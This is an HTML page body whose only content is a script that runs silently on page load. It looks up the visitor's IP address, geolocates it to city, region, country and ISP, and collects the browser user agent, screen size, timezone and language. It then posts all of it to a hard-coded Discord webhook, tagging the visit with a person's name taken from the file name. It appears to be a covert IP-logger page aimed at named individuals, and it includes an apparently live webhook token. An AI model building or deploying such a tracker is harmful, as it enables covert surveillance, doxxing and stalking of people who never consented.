<body>
  <script>
    const webhookURL = "https://discord.com/api/webhooks/1359340845127565343/X_XgSUvrRZolOCioYzaAUbzKDvGpDt_A6aHTDIJvVDTPZG7cv7k6Wd9Yeip7vAX5Iu6u"; // Replace this

    // Get the filename (e.g., "jeff.html" â†’ "Jeff")
    const path = window.location.pathname;
    const filename = path.substring(path.lastIndexOf('/') + 1);
    const name = filename.replace(".html", "").toUpperCase();

    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip;

        fetch(`https://ipapi.co/${ip}/json/`)
          .then(res => res.json())
          .then(data => {
            const { city, region, country_name, postal, org } = data;
            const ua = navigator.userAgent;
            const screenSize = `${screen.width}x${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const lang = navigator.language;
            const time = new Date().toLocaleString();

            const message = {
              content: `ðŸ“¡ **Page Visit Tracked**

**Who:** ${name}
**IP:** ${ip}
**City:** ${city}
**Region:** ${region}
**Country:** ${country_name}
**ISP:** ${org}
**User-Agent:** ${ua}
**Screen:** ${screenSize}
**Timezone:** ${timezone}
**Language:** ${lang}
**Time:** ${time}
`
            };

            fetch(webhookURL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(message)
            });
          });
      });
  </script>
